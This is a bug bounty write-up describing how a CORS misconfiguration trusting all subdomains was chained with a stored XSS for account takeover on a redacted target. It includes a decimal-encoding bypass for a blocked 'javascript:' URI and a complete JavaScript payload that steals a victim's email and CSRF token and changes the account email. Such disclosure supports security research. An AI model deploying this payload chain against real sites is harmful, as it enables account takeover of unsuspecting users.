---
title: "CORS Blimey"
date: 2021-01-28
description: "The power of chaining CORS misconfiguration with XSS for account takeover"
tags: ["CORS", "XSS", "Bug Bounty"]
---

*This vulnerability was found on a private programme, therefore parts have been redacted.*

For those that don't know about CORS (Cross-Origin Resource Sharing), it's a mechanism that uses additional HTTP headers to tell browsers to give a web application running at one origin, access to selected resources from a different origin. A web application executes a cross-origin HTTP request when it requests a resource that has a different origin from its own, such as front-end JavaScript code served from `https://first.domain.com` to make a request for data on the different domain `https://second.domain.com/data.json`.

However CORS provides great potential for cross-domain based attacks if the CORS policy is poorly configured and implemented, allowing for fantastic opportunities to **increase impact** of other vulnerabilities, such as XSS and CSRF.


To begin with, I noticed when visiting `target.com/account`, an extra request was being made to `/details/account` with a JSON response containing my email:

```
GET /details/account HTTP/1.1
...
```

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 267

{
  ...
  "email": "redacted",
  ...
}
```

When requests are being made to retrieve sensitive data, I would highly recommend probing further to see if CORS is being supported. To speed this process up, you can create a Burp Suite live task, which only looks for CORS related issues (I avoid unencrypted origin as it's only possible to exploit if you're in a position to intercept a victims traffic, normally out-of-scope):

![img](https://i.imgur.com/yutojWl.png)

I would also recommend lowering the amount of concurrent requests to avoid battering the server, and include your proxy traffic and in scope items:

![img](https://i.imgur.com/PMv9mqR.png)

![img](https://i.imgur.com/boCQzjY.png)

As you start browsing around, Burp can automatically reveal if CORS is being supported, in this case, there were no CORS related headers in the response to indicate there was, however with this live task, I was alerted:

![img](https://i.imgur.com/8lBroEo.png)

In the background, Burp made the following request, injecting an `Origin:` header with a randomly generated subdomain, which attempts to show that the invocation is coming from said generated subdomain: `https://biclldoficqk.target.com`

```
GET /details/accountDetails HTTP/1.1
Origin: https://biclldoficqk.target.com
...
```

In response, the server sends back an `Access-Control-Allow-Origin:` header. The use of these headers in the request and response show CORS in it's simplest use. In this case, the server responds with `Access-Control-Allow-Origin: https://biclldoficqk.target.com`, showing the server has reflected back the randomly generated subdomain, which means that the resource can be accessed from _any subdomain_. This often happens through laziness or a mistake, allowing access from all their subdomains (including future subdomains not yet in existence) might sound like an easier way than a strict whitelist of subdomains, but as you will see, this can be an advantage to an attacker. One of the most interesting capabilities exposed with CORS is the ability to make "credentialed" requests that are aware of HTTP cookies and HTTP Authentication information.`Access-Control-Allow-Credentials: true` means the request can be sent "credentialed" and therefore respond with the appropriate email:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://biclldoficqk.target.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 267

{
  ...
  "email": "redacted",
  ...
}
```

If the resource owners at this domain should restrict access to the resource to requests only from `https://trusted-domain.com`, they would send:

`Access-Control-Allow-Origin: https://trusted-domain.com`

Now no domain other than `https://trusted-domain.com` can access the resource in a cross-site manner. To allow access to the resource, the `Access-Control-Allow-Origin:` header should contain the value that was sent in the request's Origin header. This is also a requirement of the [OWASP ASVS](https://github.com/OWASP/ASVS) (which I contributed to 😅):
`V14.5.3 Verify that the Cross-Origin Resource Sharing (CORS) Access-Control-Allow-Origin header uses a strict white-list of trusted domains and subdomains to match against and does not support the "null" origin.`


I have seen people will report this as a vulnerability but remember, always try and show the real impact of vulnerabilities in your reports! It can be tempting to report straight away in case another researcher finds the CORS issue, but I held onto it and started probing for other vulnerabilities to chain it with.

Poking around some more, I found an older, suspicious looking change email functionality on an endpoint on another subdomain: `/details/email`, which would ask you for your old email, new email and then send a request along with a CSRF token to another endpoint:

```
POST /email/changeEmail HTTP/1.1
Host: subdomain.target.com
...

old_email=redacted&new_email=redacted&csrf=redacted
```

The `csrf=` comes from a hidden value on the `/details/email` endpoint:

![img](https://i.imgur.com/BqajS9E.png)

Even if we could find a weakness within the CSRF, we need to somehow know a user's email address to make this request on behalf of another user (which would lead to account takeover). We need to chain together the previous CORS issue, scrape the CSRF token, then force the user to make a request including these values, this is where ol' faithful XSS comes in. Due to the current CORS misconfiguration allowing for subdomains... I went searching for an XSS on a subdomain!

After [discovering some subdomains from scraping GitHub](https://github.com/gwen001/github-search/blob/master/github-subdomains.py), I came across functionality which stored input, with one particular input being put into an `anchor href attribute`:

![img](https://i.imgur.com/sbDmx18.png)

When attempting to input a `javascript:` URI, it was being blocked, which was quickly bypassed using **decimal encoding with padded zeros**: `&#0000106avascript:prompt()`, which when clicked would give us that glorious pop-up indicating our JavaScript was being executed:

![img](https://i.imgur.com/nZlFJGq.png)

Now the fun begins! We need to start building our payload to gather the values and force a request to change the victims email address via the XSS. First, let's get a user's email (which is completely hidden normally, only usernames are shown) using the CORS misconfiguration:

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://target.com/details/account',true);
req.withCredentials = true;
  req.send();
    req.onload = function() {
      var json = JSON.parse(this.responseText);
      var email = json.email;
```
This submits the victims "credentialed" CORS request which **will be successful as the origin is coming from a subdomain (and remember, the CORS is configured to accept all subdomains!)** and parses the email value from the JSON response and assigns the victims email to the `email` variable.

Next, we need to get the CSRF token:
```javascript
var reqtwo = new XMLHttpRequest();
reqtwo.open('get','https://subdomain.target.com/details/email',true);
  reqtwo.send();
    reqtwo.onload = function() {
      var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
```
This forces the victim to load the email settings page, then extracts the CSRF token and assigns it to the variable `token`.

We can then send a `POST` to the `/changeEmail` endpoint with the previously collected values and adding my email as the new email address:
```javascript
var reqthree = new XMLHttpRequest();
reqthree.open('post', 'https://subdomain.target.com/email/changeEmail', true);
reqthree.send('old_email='+email+'&new_email=my@email.com&csrf='+token);
```

Altogether, it needs to be nested as each function uses the previously assigned variable, which looks like:
```javascript
var req = new XMLHttpRequest();
req.open('get','https://target.com/details/account',true);
req.withCredentials = true;
req.send();
  req.onload = function() {
    var json = JSON.parse(this.responseText);
    var email = json.email;
    var reqtwo = new XMLHttpRequest();
    reqtwo.open('get','https://subdomain.target.com/details/email',true);
    reqtwo.send();
    reqtwo.onload = function() {
      var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
      var reqthree = new XMLHttpRequest();
      reqthree.open('post', 'https://subdomain.target.com/email/changeEmail', true);
      reqthree.send('old_email='+email+'&new_email=my@email.com&csrf='+token);
  };
};
```

Now, we can place this payload into our XSS:
```
&#0000106avascript:var req = new XMLHttpRequest(); ...
```

and when the stored XSS is clicked, it goes through the motions and successfully changes the users email address to mine:

![img](https://i.imgur.com/m6LQM6S.png)

To summarise the flow: Stored XSS on subdomain -> CORS request against whitelist of all subdomains -> get users email address -> scrape CSRF token from hidden value -> use both values to make a CSRF request to change victims email to mine